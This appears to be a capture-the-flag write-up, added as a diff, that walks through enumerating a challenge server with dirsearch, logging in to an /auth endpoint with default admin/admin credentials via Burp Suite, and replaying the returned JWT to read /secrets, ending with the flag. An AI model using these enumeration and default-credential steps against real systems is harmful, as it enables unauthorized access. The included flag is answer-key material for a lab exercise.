@@ -1,0 +1,40 @@
+1. I downloaded dirsearch using git clone and made it executable.
+git clone https://github.com/maurosoria/dirsearch.git
+cd dirsearch
+chmod +x dirsearch.py
+
+2. We are presented with a blue screen. I ran dirsearch on it
+python3 dirsearch.py -u http://34.179.142.63:32655/ -w db/dicc.txt
+
+3. I checked http://34.179.142.63:32655/auth and got a "405 Method Not Allowed" error, which told me GET requests weren't permitted, so I needed to try POST instead.
+
+4. Start up burp suite and go to repeater, paste this. If it asks to modify settings, place ip in host field and port in port field. Uncheck https and override SNI
+
+POST /auth HTTP/1.1
+Host: http://34.179.142.63:32655
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+MAKE SURE there is a blank line between "Content-Length: 2" and "{}"
+
+5. After that we will modify {} by {"username": "admin", "password": "admin"} and set Content length to 42. So it should be 
+
+POST /auth HTTP/1.1
+Host: http://34.179.142.63:30636
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+Content-Length: 42
+
+{"username": "admin", "password": "admin"}
+
+6. Okay, once you get the answer write it like this 
+
+GET /secrets HTTP/1.1
+Host: 34.179.142.63:30636
+Authorization: JWT "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3ODI4NTMzMjIsImlhdCI6MTc4Mjg1MzAyMiwibmJmIjoxNzgyODUzMDIyLCJpZGVudGl0eSI6MX0.4xdYnA5pud0fUWHnPOi0EEEFA-zTWONbbzy_-jvG06c"
+
+AND ADD ONE OR TWO BLANK LINES IN THE END OTHERWISE IT WONT WORK. REPLACE token after JWT with your token. ALSO, IT EXPIRES AFTER A WHILE SO HURRY. After all that you will get ctf in the side bar.
+CTF{5b7cc033a48df4958a076286420b4a91631defa16be26409afbdf1e053367b21}
